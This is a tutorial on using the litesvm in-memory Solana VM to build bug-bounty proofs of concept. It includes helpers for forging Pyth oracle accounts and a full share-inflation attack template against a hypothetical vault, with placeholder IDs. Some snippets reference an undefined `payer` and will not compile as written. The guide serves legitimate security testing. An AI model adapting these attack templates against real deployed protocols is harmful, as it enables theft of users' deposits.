# litesvm Deep Dive — The Default PoC Framework

litesvm is the in-memory Solana VM used for most PoCs. It compiles, deploys, and executes programs in-process without any network or validator. This is the default tool for bug bounty PoCs.

## Why litesvm

- **Speed**: <1 second per test versus ~30 seconds for `solana-test-validator`.
- **Determinism**: same input, same output, no network state.
- **Accepts .so directly**: deploy compiled BPF bytecode without RPC overhead.
- **Supports CPI**: full cross-program invocation including system_program, token, etc.
- **Easy account injection**: pre-populate accounts to skip setup steps.

## Cargo setup

```toml
[package]
name = "exploit-poc"
version = "0.1.0"
edition = "2021"

[dependencies]
litesvm = "0.6"
solana-sdk = "2.0"
solana-program = "2.0"
spl-token = "6.0"
spl-associated-token-account = "5.0"
anchor-lang = "0.30"   # if target is Anchor-based
anyhow = "1"

# Pull in the target program's IDL or types
# Often easier to manually define Account structs from the source
```

For Anchor-based targets, you can sometimes import the target program's crate as a dependency in CPI mode (`features = ["cpi"]`), giving you typed account constructors and instruction builders. This is the cleanest path when available.

## Basic structure

```rust
use litesvm::LiteSVM;
use solana_sdk::{
    pubkey::Pubkey,
    signature::Keypair,
    signer::Signer,
    transaction::Transaction,
};

fn main() {
    let mut svm = LiteSVM::new();
    
    // Load the target program from its compiled .so
    let program_id = Pubkey::from_str("TargetProgramId...").unwrap();
    let program_bytes = include_bytes!("../target_program.so");
    svm.add_program(program_id, program_bytes);
    
    // Setup actors
    let attacker = Keypair::new();
    let victim = Keypair::new();
    
    // Airdrop SOL for tx fees
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap(); // 10 SOL
    svm.airdrop(&victim.pubkey(), 10_000_000_000).unwrap();
    
    // Setup protocol state (ATAs, oracle accounts, pool accounts, etc.)
    setup_protocol(&mut svm, &attacker, &victim);
    
    // Capture before-state
    let before = read_attacker_balance(&svm, &attacker);
    
    // Execute attack
    execute_attack(&mut svm, &attacker, &victim);
    
    // Capture after-state
    let after = read_attacker_balance(&svm, &attacker);
    
    println!("BEFORE: {}", before);
    println!("AFTER:  {}", after);
    println!("DELTA:  {}", after - before);
    
    assert!(after > before, "Exploit failed");
}
```

## Loading the target program

Three ways to get the target's `.so`:

### Method 1 — Build from source

```bash
git clone <target-repo>
cd <target-repo>
git checkout <tag-matching-deployment>
cargo build-sbf --manifest-path programs/<program-name>/Cargo.toml
# Produces target/deploy/<program>.so
cp target/deploy/<program>.so /path/to/poc/
```

### Method 2 — Dump from mainnet

```bash
solana program dump <PROGRAM_ID> deployed.so --url mainnet-beta
# Produces .so identical to deployed bytecode
```

This is the most accurate option — guarantees you're testing against deployed bytecode.

### Method 3 — Embed in build

```rust
// In your PoC's lib.rs or main.rs
const TARGET_BYTES: &[u8] = include_bytes!("../target.so");
```

Then in litesvm:

```rust
svm.add_program(target_program_id, TARGET_BYTES);
```

## Account setup utilities

### Create a typed account

For Anchor accounts, you need to write the discriminator + serialized struct:

```rust
use anchor_lang::AccountSerialize;

fn create_anchor_account<T: AccountSerialize>(
    svm: &mut LiteSVM,
    pubkey: &Pubkey,
    owner: &Pubkey,
    data: &T,
) {
    let mut bytes = Vec::new();
    data.try_serialize(&mut bytes).unwrap();
    
    let lamports = svm.minimum_balance_for_rent_exemption(bytes.len());
    let account = solana_sdk::account::Account {
        lamports,
        data: bytes,
        owner: *owner,
        executable: false,
        rent_epoch: 0,
    };
    svm.set_account(*pubkey, account.into()).unwrap();
}
```

### Create an SPL token mint

```rust
fn create_mint(svm: &mut LiteSVM, mint_authority: &Pubkey) -> Pubkey {
    let mint_kp = Keypair::new();
    let mint_pubkey = mint_kp.pubkey();
    
    let rent = svm.minimum_balance_for_rent_exemption(spl_token::state::Mint::LEN);
    
    let create_ix = solana_sdk::system_instruction::create_account(
        &payer.pubkey(),
        &mint_pubkey,
        rent,
        spl_token::state::Mint::LEN as u64,
        &spl_token::ID,
    );
    
    let init_ix = spl_token::instruction::initialize_mint(
        &spl_token::ID,
        &mint_pubkey,
        mint_authority,
        None,
        9,
    ).unwrap();
    
    let tx = Transaction::new_signed_with_payer(
        &[create_ix, init_ix],
        Some(&payer.pubkey()),
        &[&payer, &mint_kp],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    
    mint_pubkey
}
```

### Create an ATA and mint tokens to it

```rust
fn create_ata_and_mint(svm: &mut LiteSVM, mint: &Pubkey, owner: &Pubkey, amount: u64, mint_authority: &Keypair) -> Pubkey {
    let ata = spl_associated_token_account::get_associated_token_address(owner, mint);
    
    let create_ata_ix = spl_associated_token_account::instruction::create_associated_token_account(
        &payer.pubkey(),
        owner,
        mint,
        &spl_token::ID,
    );
    
    let mint_ix = spl_token::instruction::mint_to(
        &spl_token::ID,
        mint,
        &ata,
        &mint_authority.pubkey(),
        &[],
        amount,
    ).unwrap();
    
    let tx = Transaction::new_signed_with_payer(
        &[create_ata_ix, mint_ix],
        Some(&payer.pubkey()),
        &[&payer, mint_authority],
        svm.latest_blockhash(),
    );
    svm.send_transaction(tx).unwrap();
    
    ata
}
```

## Reading state

```rust
fn read_account_data(svm: &LiteSVM, pubkey: &Pubkey) -> Vec<u8> {
    svm.get_account(pubkey).unwrap().data
}

fn read_token_balance(svm: &LiteSVM, ata: &Pubkey) -> u64 {
    let account = svm.get_account(ata).unwrap();
    let token_account = spl_token::state::Account::unpack(&account.data).unwrap();
    token_account.amount
}

fn read_anchor_account<T: AccountDeserialize>(svm: &LiteSVM, pubkey: &Pubkey) -> T {
    let data = svm.get_account(pubkey).unwrap().data;
    T::try_deserialize(&mut &data[..]).unwrap()
}
```

## Building target instructions

For Anchor targets, the cleanest approach is to use the target's IDL or import the crate:

```rust
// If you can import the target's crate:
use target_program::instruction as target_ix;

let ix = target_ix::Swap {
    amount_in: 1_000_000,
    min_amount_out: 0,
};

let accounts = target_program::accounts::Swap {
    pool: pool_pda,
    user: attacker.pubkey(),
    user_token_a: attacker_ata_a,
    user_token_b: attacker_ata_b,
    pool_token_a: pool_ata_a,
    pool_token_b: pool_ata_b,
    token_program: spl_token::ID,
};

let instruction = solana_sdk::instruction::Instruction {
    program_id: target_program::ID,
    accounts: accounts.to_account_metas(None),
    data: ix.data(),
};
```

If you can't import the crate, build raw:

```rust
// Discriminator for "Swap" handler in Anchor: first 8 bytes of sha256("global:swap")
let discriminator: [u8; 8] = [0x66, 0x06, 0x3d, 0x12, 0x01, 0xda, 0xeb, 0xea]; // example
let mut data = discriminator.to_vec();
data.extend_from_slice(&1_000_000u64.to_le_bytes()); // amount_in
data.extend_from_slice(&0u64.to_le_bytes()); // min_amount_out

let instruction = Instruction {
    program_id: target_program_id,
    accounts: vec![
        AccountMeta::new(pool_pda, false),
        AccountMeta::new_readonly(attacker.pubkey(), true),
        AccountMeta::new(attacker_ata_a, false),
        AccountMeta::new(attacker_ata_b, false),
        AccountMeta::new(pool_ata_a, false),
        AccountMeta::new(pool_ata_b, false),
        AccountMeta::new_readonly(spl_token::ID, false),
    ],
    data,
};
```

## Submitting transactions

```rust
let tx = Transaction::new_signed_with_payer(
    &[instruction],
    Some(&attacker.pubkey()),
    &[&attacker],
    svm.latest_blockhash(),
);

match svm.send_transaction(tx) {
    Ok(meta) => {
        println!("Tx successful");
        for log in &meta.logs {
            println!("  {}", log);
        }
    }
    Err(e) => {
        println!("Tx failed: {:?}", e);
    }
}
```

For multi-tx attacks (where atomic bundle isn't needed):

```rust
for ix in attack_instructions {
    let tx = Transaction::new_signed_with_payer(&[ix], ...);
    svm.send_transaction(tx).unwrap();
}
```

## Bumping the slot / clock

For time-dependent attacks (oracle staleness, cooldowns, etc.):

```rust
// Advance the slot
svm.warp_to_slot(svm.get_clock().slot + 100).unwrap();

// Or advance time
let mut clock = svm.get_sysvar::<solana_sdk::clock::Clock>();
clock.unix_timestamp += 3600; // +1 hour
svm.set_sysvar(&clock);
```

This is critical for testing time-locked operations and oracle staleness.

## Setting up oracle accounts

For Pyth-priced protocols:

```rust
fn setup_pyth_price(svm: &mut LiteSVM, price_account: Pubkey, price: i64, conf: u64) {
    use pyth_sdk_solana::state::*;
    
    // Construct a fake PriceAccount with the desired price
    let mut price_account_data = vec![0u8; std::mem::size_of::<PriceAccount>()];
    let price_struct = unsafe { &mut *(price_account_data.as_mut_ptr() as *mut PriceAccount) };
    
    price_struct.magic = MAGIC;
    price_struct.ver = VERSION_2;
    price_struct.atype = AccountType::Price as u32;
    price_struct.size = std::mem::size_of::<PriceAccount>() as u32;
    price_struct.ptype = PriceType::Price;
    price_struct.expo = -8;
    price_struct.agg.price = price;
    price_struct.agg.conf = conf;
    price_struct.agg.status = PriceStatus::Trading;
    price_struct.agg.pub_slot = svm.get_clock().slot;
    price_struct.timestamp = svm.get_clock().unix_timestamp;
    
    let account = solana_sdk::account::Account {
        lamports: svm.minimum_balance_for_rent_exemption(price_account_data.len()),
        data: price_account_data,
        owner: pyth_sdk_solana::pyth_oracle_id(), // or whichever Pyth program
        executable: false,
        rent_epoch: 0,
    };
    
    svm.set_account(price_account, account.into()).unwrap();
}
```

For Switchboard, similar structure but different magic / layout.

## Example: full PoC for a hypothetical share inflation bug

```rust
use litesvm::LiteSVM;
use solana_sdk::*;

fn main() {
    let mut svm = LiteSVM::new();
    let target_id = Pubkey::from_str("VaultProgramId...").unwrap();
    svm.add_program(target_id, include_bytes!("../vault.so"));
    
    let attacker = Keypair::new();
    let victim = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 100_000_000_000).unwrap();
    svm.airdrop(&victim.pubkey(), 100_000_000_000).unwrap();
    
    // Create underlying token (e.g., USDC mock)
    let mint_authority = Keypair::new();
    let usdc = create_mint(&mut svm, &mint_authority.pubkey());
    
    // Create vault
    let vault_pda = create_vault(&mut svm, target_id, usdc);
    
    // Mint USDC to actors
    let attacker_usdc = create_ata_and_mint(&mut svm, &usdc, &attacker.pubkey(), 1, &mint_authority); // 1 unit
    let victim_usdc = create_ata_and_mint(&mut svm, &usdc, &victim.pubkey(), 1_000_000_000, &mint_authority); // 1B units
    
    // STEP 1: Attacker is first depositor with 1 unit
    deposit(&mut svm, &attacker, &vault_pda, 1);
    let attacker_shares = read_share_balance(&svm, &attacker.pubkey());
    println!("Attacker shares after first deposit: {}", attacker_shares);
    assert_eq!(attacker_shares, 1);
    
    // STEP 2: Attacker donates large amount directly to vault's underlying ATA (bypassing deposit)
    let donation_amount = 1_000_000_000;
    transfer_tokens(&mut svm, &attacker, &attacker_usdc, &vault_underlying_ata(&vault_pda), donation_amount, &mint_authority);
    
    let vault_balance = read_token_balance(&svm, &vault_underlying_ata(&vault_pda));
    println!("Vault underlying balance: {}", vault_balance); // 1 + 1B
    let total_shares = read_total_shares(&svm, &vault_pda);
    println!("Total shares: {}", total_shares); // 1
    println!("Share price: {}", vault_balance / total_shares); // ~1B
    
    // STEP 3: Victim deposits 2 units (less than share price)
    deposit(&mut svm, &victim, &vault_pda, 2 * 1_000_000_000);
    let victim_shares = read_share_balance(&svm, &victim.pubkey());
    println!("Victim shares after deposit: {}", victim_shares); // ~1 (rounded down)
    
    // STEP 4: Attacker withdraws their 1 share, captures bulk of vault
    let attacker_balance_before = read_token_balance(&svm, &attacker_usdc);
    withdraw(&mut svm, &attacker, &vault_pda, 1);
    let attacker_balance_after = read_token_balance(&svm, &attacker_usdc);
    
    let extracted = attacker_balance_after - attacker_balance_before;
    println!("Attacker extracted: {}", extracted);
    println!("Attacker invested: 1 + {} = {}", donation_amount, 1 + donation_amount);
    println!("Net profit: {}", extracted as i64 - (1 + donation_amount) as i64);
    
    assert!(extracted > 1_500_000_000, "Inflation attack didn't extract significant value");
    println!("PoC succeeded: share inflation attack extracted {} from victim's deposit of 2B", extracted);
}
```

This is the canonical share inflation PoC structure. Substitute the protocol's actual instruction names and account layouts.

## Common litesvm pitfalls

1. **Forgetting to airdrop**: every signer needs SOL for tx fees. `svm.airdrop(...)` first.
2. **Wrong rent calculation**: `svm.minimum_balance_for_rent_exemption(size)` is mandatory, not a guess.
3. **Sysvars not auto-set**: the clock and rent are set, but specific values may need adjustment for time-based tests.
4. **PDA derivation**: must use the program's exact seed scheme. Check the program's source for `find_program_address` calls.
5. **Anchor discriminators**: must be exact 8-byte SHA256 of `"global:<handler_name>"`. Use `anchor-syn` or similar to compute correctly.
6. **Token program version**: `spl_token::ID` ≠ `spl_token_2022::ID`. Pick the right one for your target.
7. **Slot hashing**: some programs use slot hashes (sysvar). litesvm initializes these but may need warping.

## Performance

- Cold start: ~50ms (load svm + program).
- Per-tx: ~1-5ms.
- Full PoC: typically <1 second.

If your PoC takes >5 seconds, something's wrong (probably loading too many programs or doing redundant setup).

## Debugging

- Print logs from failed txs: `meta.logs.iter().for_each(|l| println!("{}", l));`
- Use `solana_logger::setup()` for low-level Solana logs.
- Compile target program with debug symbols: `cargo build-sbf --features debug` if available.

litesvm is the most productive PoC environment for Solana. Master it.
